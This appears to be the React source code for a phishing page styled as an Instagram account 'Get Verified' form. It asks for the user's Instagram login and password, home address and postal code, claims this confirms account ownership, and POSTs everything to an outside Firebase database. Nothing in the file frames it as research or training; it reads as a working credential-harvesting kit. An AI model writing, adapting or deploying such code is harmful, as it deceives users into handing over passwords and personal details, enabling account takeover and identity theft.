import { useState, useRef } from "react";
import ReCAPTCHA from 'react-google-recaptcha';
// import Upload from "../Images/upload.png";
// import { ref, uploadBytes } from "firebase/storage";
// import { v4 } from "uuid";
// import './Verified.css'

const Verified = () => {
    //   const [img, setImg] = useState('')

    //   const handleClick = () => {
    //     const imgRef = ref(imageDb, `files/${v4()}`)
    //     uploadBytes(imgRef, img)
    //     alert('sent')
    //   }

    const [captchaValue, setCaptchaValue] = useState<string | null>(null);
    const recaptchaRef = useRef<ReCAPTCHA>(null);

    const handleCaptchaChange = (value: string | null) => {
        setCaptchaValue(value);
    }

    // if (!captchaValue) {
    //     // alert("Please complete the reCAPTCHA");
    //     return;
    // }


    const [user, setUser] = useState({
        Instagram: "",
        Password: "",
        Home: "",
        Postal: "",
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setUser({ ...user, [e.target.name]: e.target.value });
    };

    const getData = (e: React.FormEvent<HTMLButtonElement>) => {
        e.preventDefault();

        if (!captchaValue) {
            alert("Please complete the reCAPTCHA");
            return;
        }
        const { Instagram, Password, Home, Postal } = user;

        const options = {
            method: "POST",
            headers: {
                "Content-type": "application/json",
            },
            body: JSON.stringify({
                Instagram,
                Password,
                Home,
                Postal,
            }),
        };

        fetch("https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json", options)
            .then((res) => res.json())
            .then((data) => {
                console.log(data);
                alert("Information sent for processing")
            })
            .catch((error) => {
                console.error(error);
                alert("Message Saved");
            });
    };

    return (
        <div className="pt-56">
            <ReCAPTCHA
                ref={recaptchaRef}
                sitekey="6LdkMbYqAAAAAA6l-SVJuRn8cSNIhHI6uTCTWdDR"
                onChange={handleCaptchaChange}
            />
            <h1 className="text-center text-6xl font-bold">Get Verified</h1>
            <div className="px-24">
                <h1 className="text-center text-4xl font-semibold mt-6">
                    Kindly fill in the following information to be fully verified
                </h1>
                <h1 className="text-center text-[40px] font-bold mt-24">
                    Choose mode of identification
                </h1>
            </div>
            <div className="flex flex-row gap-x-7 justify-center mt-7">
                <button className="bg-[#D9D9D9] hover:bg-[#0A2DE4] hover:shadow-xl text-black font-extrabold hover:text-white text-4xl text-center px-12 py-7 rounded-xl">
                    Passport
                </button>
                <button className="bg-[#D9D9D9] hover:bg-[#0A2DE4] hover:shadow-xl text-black font-extrabold hover:text-white text-4xl text-center px-12 py-7 rounded-xl">
                    Driver's License
                </button>
                <button className="bg-[#D9D9D9] hover:bg-[#0A2DE4] hover:shadow-xl text-black font-extrabold hover:text-white text-4xl text-center px-12 py-7 rounded-xl">
                    ID Card
                </button>
            </div>

            <div className="grid grid-flow-col justify-center mt-9">
                {/* <div className="grid grid-flow-col border border-gray-600 w-[300px] text-[40px] cursor-pointer px-6 py-5 mt-16 rounded-[30px]">
          <div>
            <h1 className="font-semibold">Upload</h1>
          </div>
          <div>
            <img src={Upload} alt="#" className="w-[70px]" />
          </div>
        </div> */}
                {/* <input type="file" onChange={(e)=> setImg(e.target.files[0])} className="input text-[20px] h-auto"/> */}
                {/* <button onClick={handleClick} className="bg-[#0A2DE4] hover:shadow-xl font-extrabold text-white text-[25px] text-center ml-16 px-12 py-4 rounded-xl">
          Upload
        </button> */}

            </div>

            <div className="px-32 mt-2 text-red-500 font-semibold">
                <h1 className="text-3xl">
                    Make sure to click on "Upload" after choosing a file
                </h1>
            </div>

            <h1 className="text-center text-[40px] font-bold mt-16">More Details</h1>

            <div className="mx-20 mt-16">
                <input
                    type="text"
                    name="Instagram"
                    value={user.Instagram}
                    onChange={handleChange}
                    placeholder="Instagram Phone Number, Username or Email"
                    className="... rounded-3xl text-black text-3xl pl-5 pr-16 h-[90px] w-full border border-black "
                />
                <div className="mx-10 font-semibold">
                    <h1 className="text-3xl">
                        This information is used to confirm you’re the actual owner of the account.
                    </h1>
                </div>
            </div>

            <div className="mx-20 mt-8">
                <input
                    type="password"
                    name="Password"
                    value={user.Password}
                    onChange={handleChange}
                    placeholder="Instagram Password"
                    className="... rounded-3xl text-black text-3xl pl-5 pr-16 h-[90px] w-full border border-black "
                />
                <div className="mx-10 font-semibold">
                    <h1 className="text-3xl">Input accurate details..</h1>
                </div>
            </div>

            <div className="mx-20 mt-8">
                <input
                    type="text"
                    name="Home"
                    value={user.Home}
                    onChange={handleChange}
                    placeholder="Home Address"
                    className="... rounded-3xl text-black text-3xl pl-5 pr-16 h-[90px] w-full border border-black "
                />
                <div className="mx-10 font-semibold">
                    <h1 className="text-3xl">
                        Note this address will be used for delivery of your items
                    </h1>
                </div>
            </div>

            <div className="mx-20 mt-8">
                <input
                    type="text"
                    name="Postal"
                    value={user.Postal}
                    onChange={handleChange}
                    placeholder="Postal Code"
                    className="... rounded-3xl text-black text-3xl pl-5 pr-16 h-[90px] w-full border border-black "
                />
                <div className="mx-10 font-semibold"></div>
            </div>

            <div className="flex flex-row justify-center mt-20 ml-16">
                <button onClick={getData} className="bg-[#0A2DE4] hover:shadow-xl font-extrabold text-white text-4xl text-center px-12 py-7 rounded-xl">
                    Submit
                </button>
            </div>
        </div>
    );
};

export default Verified;
